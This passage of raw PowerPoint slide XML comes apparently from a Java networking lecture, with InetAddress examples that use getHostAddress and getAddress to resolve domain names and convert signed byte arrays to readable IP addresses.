              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress Addresses[] = InetAddress.getAllByName("www.szu.edu.cn");</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for (InetAddress address : Addresses)</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Local address: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" + address.getHostAddress());</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="150967"/>
            <a:ext cx="11734800" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getHostAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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28600" y="152400"/>
            <a:ext cx="11582400" cy="114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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getHostAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52227" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="990600"/>
            <a:ext cx="11201399" cy="556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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a: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endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5222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0" y="3124200"/>
            <a:ext cx="7010400"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76200" y="152400"/>
            <a:ext cx="11887200" cy="914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marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="990600"/>
            <a:ext cx="11734800" cy="5562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r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method is similar to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getHostAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, the difference is that the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getHostAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address in string form, while </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the getAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the IP address in byte </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>array form . </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Method definition:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>byte array </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>returned by this method is signed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, the value range of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>byte </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>type is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-128 to 127 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>a byte of the returned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP address is an integer greater than 127 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, it will be a negative number in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>byte </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>array.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Since there is no unsigned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>byte type in Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, in order to display a normal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address, you must use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>long </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>type.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>The following code demonstrates how to use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>to return an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address and how to convert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>an IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>address into a positive integer.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981201" y="2174876"/>
            <a:ext cx="8348663" cy="3397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a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public byte[] getAddress()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin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170339" y="990599"/>
            <a:ext cx="11793061" cy="563340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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Operation Results</a:t>
            </a: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endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>Analysis: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>The first line outputs the unconverted </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>address. Since the first byte of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>www.csdn.net is greater than 127 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>, a negative number is output. The second line outputs a normal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>address because </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54276" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1371600" y="748050"/>
            <a:ext cx="9053512" cy="36317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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>GetIP2{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</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InetAddress address = InetAddress.getByName("www.csdn.net");</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byte ip[] = address.getAddress();</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for (byte ipSegment : ip)</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System.out.print(ipSegment + " ");</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System.out.println("");</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for (byte ipSegment : ip)</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int newIPSegment = (ipSegment &lt; 0) ? 256 + ipSegment : ipSegment;</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System.out.print(newIPSegment + " ");</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="563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95600" y="4419600"/>
            <a:ext cx="4078288" cy="1347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29606" y="133987"/>
            <a:ext cx="11716861" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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10" end="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xfrm>
            <a:off x="1063625" y="146049"/>
            <a:ext cx="8540750" cy="838200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" dirty="0"/>
              <a:t>How to obtain</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55299" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="858838"/>
            <a:ext cx="11811000" cy="1120775"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800"/>
              <a:t>Given an address, find the host alias </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800"/>
              <a:t>first get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800"/>
              <a:t>the InternetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800"/>
              <a:t>object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800"/>
              <a:t>then convert it to get the host alias</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="55300"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052638" y="4800601"/>
            <a:ext cx="8462962"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84375" y="2351087"/>
            <a:ext cx="762000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167" y="228600"/>
            <a:ext cx="11387667" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7. Testing IP Address Properties</a:t>
            </a:r>
